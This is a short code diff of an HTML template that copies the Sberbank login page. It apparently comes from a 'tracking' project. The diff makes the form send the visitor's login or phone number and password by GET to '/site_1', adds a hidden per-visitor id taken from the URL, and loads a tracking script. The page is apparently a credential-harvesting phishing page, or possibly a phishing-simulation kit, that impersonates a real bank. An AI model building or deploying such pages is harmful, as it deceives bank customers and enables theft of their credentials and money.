@@ -5,9 +5,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>СберБанк - Вход</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_1.css" />
-</head>
-<!-- "{{ url_for('static', filename='css/style_1.css') }}" -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_1.css') }}">
 
 <body>
     <div class="container">
@@ -17,7 +15,8 @@
         <h1>С возвращением!</h1>
         <p>Введите номер телефона или логин и пароль, которые вы устанавливали при регистрации</p>
 
-        <form>
+        <form action="/site_1" method="get">
+            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
             <label for="login">Номер телефона или логин</label>
             <input type="text" id="login" name="login" required />
 
@@ -44,7 +43,7 @@
             password.type = password.type === "password" ? "text" : "password";
         });
     </script>
-    <script src="D:\April\tracking_project\static\js\track_example_2.js"></script>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
